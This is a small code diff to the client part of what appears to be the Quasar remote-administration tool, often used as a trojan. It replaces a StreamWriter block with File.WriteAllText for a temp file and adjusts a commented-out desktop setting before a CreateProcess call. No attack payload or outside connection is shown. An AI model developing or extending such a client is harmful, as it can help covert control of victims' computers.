@@ -43,10 +43,11 @@ namespace Quasar.Client.Messages
                 string text9 = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".txt");
                 try
                 {
-                    using (StreamWriter writer = new StreamWriter(text9, false, System.Text.Encoding.Unicode))
-                    {
-                        writer.Write(contentStr);
-                    }
+                    //using (StreamWriter writer = new StreamWriter(text9, false, System.Text.Encoding.Unicode))
+                    //{
+                    //    writer.Write(contentStr);
+                    //}
+                    File.WriteAllText(text9, contentStr);
                 }
                 catch (Exception)
                 {
@@ -76,8 +77,7 @@ namespace Quasar.Client.Messages
                     NativeMethods.STARTUPINFO structure = default(NativeMethods.STARTUPINFO);
                     NativeMethods.PROCESS_INFORMATION process_INFORMATION = default(NativeMethods.PROCESS_INFORMATION);
                     structure.cb = (uint)Marshal.SizeOf<NativeMethods.STARTUPINFO>(structure);
-                    // structure.lpDesktop = client.currentDesktopString;
-                    
+                    // structure.lpDesktop = client.currentDesktopString;                    
                     
                     if (!NativeMethods.CreateProcess(null, string.Format("\"{0}\" \"{1}\" \"{2}\"", text10, text9, num), IntPtr.Zero, IntPtr.Zero, false, 0U, IntPtr.Zero, null, ref structure, out process_INFORMATION))
                     {
